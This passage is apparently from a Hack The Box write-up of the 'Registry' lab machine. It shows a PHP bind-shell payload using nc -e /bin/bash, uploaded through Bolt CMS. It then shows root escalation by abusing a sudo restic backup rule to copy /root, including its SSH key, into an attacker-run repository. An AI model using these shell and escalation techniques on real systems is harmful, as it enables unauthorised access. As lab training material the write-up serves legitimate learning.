+<p>After a bit of playing around with file uploads, it&rsquo;ll probably become apparant that PHP reverse shells don&rsquo;t seem to work. If we go back the SSH access we have via the Bolt user, we can see whether iptables is configured to make our lives difficult:</p>
+<pre><code>bolt@bolt:/var/www/html$ cat /etc/iptables.conf | grep -i drop
+-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
+-A OUTPUT -d 10.0.0.0/8 -p udp -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
+-A DOCKER-ISOLATION-STAGE-2 -o br-1bad9bd75d17 -j DROP
+</code></pre><p>Sneaky, sneaky! All outbound connections to any IP on the 10. range will be dropped - TCP connections will be dropped depending on the packet type that is sent. You&rsquo;ll notice that ICMP is not included here, so pings will work successfully. This may have fooled some people into thinking their reverse shells should work. UDP connections are also blocked entirely. Which means that we&rsquo;re going to need to try a <strong>bind</strong> shell.</p>
+<p>For those that aren&rsquo;t aware, a bind shell is (sorta) the opposite of a reverse shell; when you configure a reverse shell, you typically setup a listener on your host machine and have the remote machine connect <em>back to you</em>. When that isn&rsquo;t possible you may be able to configure a bind shell which means you configure the remote server to bind to a port on the <em>server-side</em> that you then connect to from your host machine.</p>
+<p>Initially I tried using the version of <code>nc</code> that was on the box, but this is an earlier version that doesn&rsquo;t come compiled with the ability to use the <code>-e</code> (execute) flag - therefore, in order to do this properly, I did the following:</p>
+<p><strong>1)</strong> Upload a new copy of nc (inclusive of the execute flag) to a folder on the server (e.g. /dev/shm); this can be done using the bolt user over SCP. Also, change the file perms to 777.</p>
+<p><strong>2)</strong> Update Bolt config via web GUI to allow for PHP file uploads (as explained above)</p>
+<p><strong>3)</strong> Upload a PHP script that runs, via system(), nc on that server. It includes <code>/bin/bash</code> as executable arguments and a listening port, e.g:</p>
+<pre><code>skynet Registry/bolt » cat exploit.php
+&lt;?php
+system('/dev/shm/nc -e /bin/bash -lvnp 9001');
+?&gt;
+</code></pre><p><strong>4)</strong> Run the script via a browser to actually setup the listener on the box (e.g. http://10.10.10.159/bolt/files/exploit.php)</p>
+<p><strong>5)</strong> Connect from local machine, e.g;</p>
+<p><code>skynet Registry/bolt » nc 10.10.10.159 9001</code></p>
+<p>We now have a shell as the www-data user. I opted to quickly run another LinEnum scan with this user but, whilst that ran, I also decided to try some of the basics that didn&rsquo;t work using our bolt user, namely our ability to run <code>sudo -l</code> to list commands we can run, via that user, with sudo:</p>
+<pre><code>www-data@bolt:~$ sudo -l
+Matching Defaults entries for www-data on bolt:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bolt:
+    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+</code></pre><p>So the next step is to leverage the www-data account to create a backup using sudo and restic, through the REST protocol. In order to really exploit this without prior knowledge you need to look into two things:</p>
+<ol>
+<li>Restic itself - I found the <a href="https://restic.readthedocs.io/en/latest/" target="_blank">documentation</a>
+ rather comprehensive, at least in terms of figuring out how the backup/restore process works.</li>
+<li>Restic Rest Server - you&rsquo;ll need to upload a compiled version of <a href="https://github.com/restic/rest-server" target="_blank">this</a>
+ binary in order to exploit this properly.</li>
+</ol>
+<p>Armed with some new syntaxical knowledge and a restic REST binary (confusing, I know) we can try and root this box.</p>
+<blockquote>
+<p>N.B - I opted to do all of this on the remote machine due to the restrictions we showed earlier with the firewall. You could use Chisel or SSH to point the <a href="https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server" target="_blank">default REST port</a>
+ (8000) back to your machine, before you handle all of this between remote/local hosts.</p>
+</blockquote>
+<p>The method I used was as follows:</p>
+<p>Firstly, create a directory, via the bolt user - this will be used to host a repository, e.g. (the default) /tmp/restic. From there initialize that folder with restic as a repo:</p>
+<p><code>bolt@bolt:~$ restic init --repo /tmp/restic</code></p>
+<p>This configures literally everything for you as well as prompting you to setup a repo password.</p>
+<p>From there I uploaded a copy of a binary I referenced earlier called ‘rest-server’ - this was downloaded and compiled (pretty quickly via golang) on my Kali box. I then uploaded it via scp using the bolt user and hosted the newly created repo via the rest-server binary:</p>
+<p><code>bolt@bolt:~$ ./rest-server --no-auth</code></p>
+<blockquote>
+<p>N.B: If you do not use the default /tmp/restic path as your repository folder, you&rsquo;ll need to specify the full path of your repo using the &ndash;path argument with rest-server</p>
+</blockquote>
+<p>This starts the server on its default port (8080) and /tmp/restic is the default data directory.</p>
+<p>From there we hop onto the www-data user, and run the following command to backup the machines <code>/root</code> directory into our local REST repository - all of this was achieved by simply reading the Restic docs:</p>
+<pre><code>www-data@bolt:~/html$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root
+enter password for repository: password
+password is correct
+found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
+scan [/root]
+scanned 10 directories, 14 files in 0:00
+[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00
+duration: 0:00
+snapshot 898355a7 saved
+www-data@bolt:~/html$
+</code></pre><p>Back on our bolt user, we then list the snapshots we have in the repo:</p>
+<p><code>bolt@bolt:~$ restic -r /tmp/restic snapshots</code></p>
+<p>And restore the one we want, e.g:</p>
+<p><code>bolt@bolt:~$ restic -r /tmp/restic restore latest --target /tmp/restic --path &quot;/root&quot;</code></p>
+<p>The <code>--path</code> argument just defines the directory we want to restore from the listed snapshots. The <code>--target</code> argument defines the folder into which the data gets restored. As the original owner of the files was root, restic will try and chown the files back to that ownership when you run the restore; this will fail because the bolt user cannot change file permissions to the root user. I outline this because the ownership change failures get shown as errors in the restore output which can be deceiving; the data does get restored. In this case we got the entire contents of the /root folder, including the flag file and the .ssh folder containing a key we can use to connect via SSH, without a passphrase.</p>
+<pre><code>root@bolt:~# wc -c root.txt
+33 root.txt
+</code></pre><p>And that&rsquo;s the box! For those interested, this introduction to Restic caused me to migrate over to that application for my home backups and it&rsquo;s genuinely brilliant. The weakness here was in the way sudo had been configured to allow backups to be taken of root owned files by a non-root user, not the restic application itself.</p>
+<p>I hope you enjoyed the read.</p>
+
+      </div></div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="https://5ysk3y.github.io/htb/guides/sniper/">
+          <span class="button__text">Sniper [Hard] - Windows</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://5ysk3y.github.io/assets/main.js"></script>
+<script src="https://5ysk3y.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
